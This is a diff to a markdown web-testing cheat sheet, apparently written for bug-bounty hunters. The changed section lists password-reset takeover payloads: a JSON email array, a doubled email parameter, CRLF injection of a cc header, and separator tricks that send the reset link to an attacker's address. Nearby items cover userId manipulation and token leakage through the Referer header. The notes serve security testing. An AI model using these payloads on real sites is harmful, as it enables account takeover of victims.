@@ -7,17 +7,21 @@
 - Viewing/editing other users private data (addresses, phone numbers) with userID manipulation
     
     ### Reset Password [https://infosecwriteups.com/all-about-password-reset-vulnerabilities-3bba86ffedc7]
-    
+
     - reseting password change with victim userId 
 
     - Password reset with manipulating email parameter: [https://hackerone.com/reports/1175081]
-    JSON: {"email":["victim@gmail.com","your@gmail.com"]} 
-    Double parameter: email=victim@xyz.tld&email=hacker@xyz.tld
-    carbon copy: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
-    Using separators: email=victim@xyz.tld,hacker@xyz.tld
-                    email=victim@xyz.tld%20hacker@xyz.tld
-                    email=victim@xyz.tld|hacker@xyz.tld
-    
+    ```
+        JSON: {"email":["victim@gmail.com","your@gmail.com"]} 
+
+        Double parameter: email=victim@xyz.tld&email=hacker@xyz.tld
+
+        carbon copy: email=victim@xyz.tld%0a%0dcc:hacker@xyz.tld
+        
+        Using separators: email=victim@xyz.tld,hacker@xyz.tld
+                        email=victim@xyz.tld%20hacker@xyz.tld
+                        email=victim@xyz.tld|hacker@xyz.tld
+    ```
     
 
     - Password reset token leakage via Referer Header [https://hackerone.com/reports/342693] [https://hackerone.com/reports/272379]
